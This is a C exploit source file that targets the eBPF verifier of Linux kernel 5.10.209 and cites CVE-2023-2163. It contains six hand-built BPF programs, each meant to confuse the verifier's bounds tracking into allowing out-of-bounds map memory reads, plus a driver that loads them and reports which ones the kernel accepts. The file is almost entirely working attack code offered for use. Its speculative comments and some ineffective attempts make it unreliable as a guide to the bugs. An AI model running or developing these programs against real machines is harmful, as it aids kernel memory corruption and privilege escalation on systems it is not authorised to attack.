/*
 * BPF Verifier Bypass Exploit for Kernel 5.10.209
 *
 * Target: unprivileged_bpf_disabled=0, bpf_jit_enable=1
 *
 * This tool attempts to exploit BPF verifier bugs:
 * 1. CVE-2023-2163 - BPF Verifier incorrect pruning (5.10 affected)
 * 2. Register bounds tracking confusion
 * 3. ALU32 operations confusion
 * 4. Map bounds escape
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* BPF instructions helper macros */
#define BPF_LD_MAP_FD(DST, MAP_FD)                                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = BPF_PSEUDO_MAP_FD, .off = 0, .imm = MAP_FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_MOV32_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | (OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_ALU32_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_ALU32_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU | (OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_JMP_REG(OP, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | (OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP32 | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    ((struct bpf_insn){.code = BPF_ST | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_CALL_FUNC(FUNC) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = FUNC})

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \
    ((struct bpf_insn){.code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

/* BPF function IDs */
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2
#define BPF_FUNC_map_delete_elem 3
#define BPF_FUNC_probe_read 4
#define BPF_FUNC_get_prandom_u32 7
#define BPF_FUNC_get_current_pid_tgid 14
#define BPF_FUNC_get_current_uid_gid 15
#define BPF_FUNC_get_current_comm 16
#define BPF_FUNC_skb_load_bytes 26
#define BPF_FUNC_ringbuf_output 130
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_FUNC_ringbuf_submit 132

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

static char verifier_log[65536];

int create_map(int type, int key_size, int val_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = val_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_program(struct bpf_insn *insns, int insn_cnt, const char *name)
{
    memset(verifier_log, 0, sizeof(verifier_log));

    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)insns,
        .insn_cnt = insn_cnt,
        .license = (unsigned long long)"GPL",
        .log_level = 2,
        .log_size = sizeof(verifier_log),
        .log_buf = (unsigned long long)verifier_log,
    };

    int fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0)
    {
        printf("[%s] FAILED: %s\n", name, strerror(errno));
        if (strlen(verifier_log) > 0)
        {
            printf("Verifier log:\n%s\n", verifier_log);
        }
    }
    else
    {
        printf("[%s] SUCCESS: fd=%d\n", name, fd);
    }
    return fd;
}

/*
 * Attempt 1: CVE-2023-2163 style - Verifier state pruning confusion
 *
 * The verifier may incorrectly prune states when register bounds
 * are not properly tracked across conditional branches.
 */
int test_cve_2023_2163(void)
{
    printf("\n[TEST 1] CVE-2023-2163 Style Verifier Bypass\n");
    printf("=============================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 16);
    if (map_fd < 0)
    {
        printf("[-] Failed to create map\n");
        return -1;
    }
    printf("[+] Map created: fd=%d\n", map_fd);

    /*
     * This program attempts to confuse the verifier's state pruning.
     * Key insight: The verifier prunes states it considers equivalent,
     * but register bounds may not be properly transferred.
     */
    struct bpf_insn insns[] = {
        /* r6 = map_fd */
        BPF_LD_MAP_FD(6, map_fd),

        /* r1 = &r10[-8] (key on stack) */
        BPF_MOV64_REG(1, 10),
        BPF_ALU64_IMM(BPF_ADD, 1, -8),
        BPF_ST_MEM(BPF_W, 10, -8, 0),

        /* r2 = r1 (key ptr) */
        BPF_MOV64_REG(2, 1),

        /* r1 = map_fd */
        BPF_MOV64_REG(1, 6),

        /* r0 = map_lookup_elem(map, key) */
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),

        /* if (r0 == NULL) exit */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 20),

        /* r7 = r0 (save value ptr) */
        BPF_MOV64_REG(7, 0),

        /* r8 = prandom() */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32),
        BPF_MOV64_REG(8, 0),

        /* r8 &= 0xFFFF */
        BPF_ALU64_IMM(BPF_AND, 8, 0xFFFF),

        /* Bounds confusion trigger:
         * Use 32-bit operation followed by 64-bit check
         */
        BPF_ALU32_IMM(BPF_ADD, 8, 1), /* 32-bit add */

        /* If r8 > 0xFFFF, skip (should never happen after AND) */
        BPF_JMP_IMM(BPF_JGT, 8, 0xFFFF, 5),

        /* But verifier might not track 32-bit properly */
        BPF_ALU64_IMM(BPF_AND, 8, 7), /* r8 &= 7 */

        /* r7 += r8 (offset into value) */
        BPF_ALU64_REG(BPF_ADD, 7, 8),

        /* Read from value + offset */
        BPF_LDX_MEM(BPF_B, 0, 7, 0),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),

        /* NULL path */
        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    load_program(insns, ARRAY_SIZE(insns), "CVE-2023-2163");
    close(map_fd);
    return 0;
}

/*
 * Attempt 2: ALU32/ALU64 bounds tracking confusion
 */
int test_alu32_confusion(void)
{
    printf("\n[TEST 2] ALU32/ALU64 Bounds Confusion\n");
    printf("======================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 64, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),

        /* Prepare stack for key */
        BPF_MOV64_REG(1, 10),
        BPF_ALU64_IMM(BPF_ADD, 1, -8),
        BPF_ST_MEM(BPF_W, 10, -8, 0),
        BPF_MOV64_REG(2, 1),
        BPF_MOV64_REG(1, 6),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 28),

        BPF_MOV64_REG(7, 0), /* r7 = value ptr */

        /* r8 = prandom() */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32),
        BPF_MOV64_REG(8, 0),

        /* Key trick: 32-bit operations that affect upper 32 bits */
        BPF_ALU32_IMM(BPF_MOV, 8, 0xFFFFFFFF), /* w8 = -1 (32-bit) */

        /* Now r8 should be 0x00000000FFFFFFFF */
        /* But some verifier versions might think it's still unknown */

        /* Shift right to clear most bits */
        BPF_ALU64_IMM(BPF_RSH, 8, 26), /* r8 >>= 26, result should be 0-63 */

        /* Multiple checks to confuse state pruning */
        BPF_JMP_IMM(BPF_JGE, 8, 64, 10), /* if r8 >= 64, skip */
        BPF_JMP_IMM(BPF_JGE, 8, 64, 9),  /* duplicate check */

        /* At this point verifier should know r8 < 64 */
        BPF_ALU64_REG(BPF_ADD, 7, 8), /* value ptr + offset */

        /* Try to read - should be safe within bounds */
        BPF_LDX_MEM(BPF_B, 0, 7, 0),

        /* Now try potential OOB with subtle manipulation */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32),
        BPF_MOV64_REG(9, 0),
        BPF_ALU32_IMM(BPF_AND, 9, 0xFF), /* 32-bit AND */
        /* After 32-bit AND, upper bits should be 0, but let's see */

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    load_program(insns, ARRAY_SIZE(insns), "ALU32_Confusion");
    close(map_fd);
    return 0;
}

/*
 * Attempt 3: Scalar to pointer conversion confusion
 */
int test_scalar_ptr_confusion(void)
{
    printf("\n[TEST 3] Scalar to Pointer Confusion\n");
    printf("=====================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 16);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),

        BPF_MOV64_REG(1, 10),
        BPF_ALU64_IMM(BPF_ADD, 1, -8),
        BPF_ST_MEM(BPF_W, 10, -8, 0),
        BPF_MOV64_REG(2, 1),
        BPF_MOV64_REG(1, 6),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 15),

        BPF_MOV64_REG(7, 0), /* r7 = map value ptr */

        /* Store and reload pointer through memory */
        BPF_STX_MEM(BPF_DW, 10, 7, -16), /* [fp-16] = r7 */

        /* Get scalar value */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32),
        BPF_ALU64_IMM(BPF_AND, 0, 0), /* r0 = 0 */

        /* Reload pointer */
        BPF_LDX_MEM(BPF_DW, 8, 10, -16), /* r8 = [fp-16] */

        /* Try to confuse: add 0 via register */
        BPF_ALU64_REG(BPF_ADD, 8, 0), /* r8 += r0 (r0 is 0) */

        /* Use the pointer */
        BPF_LDX_MEM(BPF_DW, 0, 8, 0),

        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    load_program(insns, ARRAY_SIZE(insns), "Scalar_Ptr_Confusion");
    close(map_fd);
    return 0;
}

/*
 * Attempt 4: JMP32 vs JMP64 confusion
 */
int test_jmp32_confusion(void)
{
    printf("\n[TEST 4] JMP32 vs JMP64 Confusion\n");
    printf("==================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 256, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),

        BPF_MOV64_REG(1, 10),
        BPF_ALU64_IMM(BPF_ADD, 1, -8),
        BPF_ST_MEM(BPF_W, 10, -8, 0),
        BPF_MOV64_REG(2, 1),
        BPF_MOV64_REG(1, 6),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 22),

        BPF_MOV64_REG(7, 0),

        /* Get random value */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32),
        BPF_MOV64_REG(8, 0),

        /* Create value with specific pattern */
        /* r8 = 0x00000001_00000000 if we can get high bits set */
        BPF_ALU64_IMM(BPF_LSH, 8, 32),  /* shift left 32 bits */
        BPF_ALU64_IMM(BPF_OR, 8, 0xFF), /* r8 |= 0xFF */

        /* JMP32 only checks lower 32 bits! */
        BPF_JMP32_IMM(BPF_JGT, 8, 255, 8), /* if w8 > 255 goto exit */

        /* But JMP64 would see the high bits */
        /* At this point: 32-bit view: r8 <= 255 */
        /* 64-bit view: r8 could be much larger due to high bits */

        /* Safe according to 32-bit check, but... */
        BPF_ALU64_REG(BPF_ADD, 7, 8), /* ptr += potentially large value */

        BPF_LDX_MEM(BPF_B, 0, 7, 0),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    load_program(insns, ARRAY_SIZE(insns), "JMP32_Confusion");
    close(map_fd);
    return 0;
}

/*
 * Attempt 5: Sign extension confusion
 */
int test_sign_extension(void)
{
    printf("\n[TEST 5] Sign Extension Confusion\n");
    printf("==================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 128, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),

        BPF_MOV64_REG(1, 10),
        BPF_ALU64_IMM(BPF_ADD, 1, -8),
        BPF_ST_MEM(BPF_W, 10, -8, 0),
        BPF_MOV64_REG(2, 1),
        BPF_MOV64_REG(1, 6),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 18),

        BPF_MOV64_REG(7, 0),

        /* Load 32-bit value with sign bit set */
        BPF_MOV32_IMM(8, -1), /* w8 = 0xFFFFFFFF */

        /* When treated as signed 64-bit, this is -1 */
        /* When treated as unsigned 64-bit, this is 0x00000000FFFFFFFF */

        /* Signed comparison */
        BPF_JMP_IMM(BPF_JSLT, 8, 0, 8), /* if r8 < 0 (signed), skip */

        /* Unsigned check */
        BPF_JMP_IMM(BPF_JGT, 8, 127, 6), /* if r8 > 127, skip */

        /* At this point, verifier might be confused about the actual value */
        BPF_ALU64_REG(BPF_ADD, 7, 8),

        BPF_LDX_MEM(BPF_B, 0, 7, 0),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    load_program(insns, ARRAY_SIZE(insns), "Sign_Extension");
    close(map_fd);
    return 0;
}

/*
 * Attempt 6: Map bounds escape via adjusted value
 */
int test_map_bounds_escape(void)
{
    printf("\n[TEST 6] Map Bounds Escape\n");
    printf("==========================\n");

    /* Create map with specific size to trigger edge cases */
    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 4096, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),

        BPF_MOV64_REG(1, 10),
        BPF_ALU64_IMM(BPF_ADD, 1, -8),
        BPF_ST_MEM(BPF_W, 10, -8, 0),
        BPF_MOV64_REG(2, 1),
        BPF_MOV64_REG(1, 6),
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 25),

        BPF_MOV64_REG(7, 0), /* r7 = map value base */

        /* Known safe offset */
        BPF_MOV64_IMM(8, 4088), /* offset = 4088 */

        /* Multiple additions to confuse tracking */
        BPF_ALU64_REG(BPF_ADD, 7, 8), /* ptr + 4088 */

        /* Now within bounds (4096 - 4088 = 8 bytes remaining) */

        /* Try to read at boundary */
        BPF_LDX_MEM(BPF_DW, 0, 7, 0), /* read 8 bytes at offset 4088 - exactly at limit */

        /* Now add more */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32),
        BPF_ALU64_IMM(BPF_AND, 0, 15), /* r0 = 0-15 */
        BPF_MOV64_REG(8, 0),

        /* Verifier should reject this if tracking properly */
        BPF_ALU64_REG(BPF_ADD, 7, 8), /* ptr + (0-15) more */

        /* This might go OOB */
        BPF_JMP_IMM(BPF_JGE, 8, 8, 4), /* if r8 >= 8, skip */
        BPF_LDX_MEM(BPF_B, 0, 7, 0),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(0, 0),
        BPF_EXIT_INSN(),
    };

    load_program(insns, ARRAY_SIZE(insns), "Map_Bounds_Escape");
    close(map_fd);
    return 0;
}

int main(void)
{
    printf("========================================\n");
    printf("BPF Verifier Bypass Exploit\n");
    printf("Kernel: 5.10.209-perf\n");
    printf("========================================\n");

    /* Check BPF availability */
    int test_map = create_map(BPF_MAP_TYPE_ARRAY, 4, 4, 1);
    if (test_map < 0)
    {
        printf("[-] BPF not available or permission denied\n");
        return 1;
    }
    printf("[+] BPF available\n");
    close(test_map);

    /* Run all tests */
    test_cve_2023_2163();
    test_alu32_confusion();
    test_scalar_ptr_confusion();
    test_jmp32_confusion();
    test_sign_extension();
    test_map_bounds_escape();

    printf("\n========================================\n");
    printf("Tests Complete\n");
    printf("========================================\n");

    return 0;
}
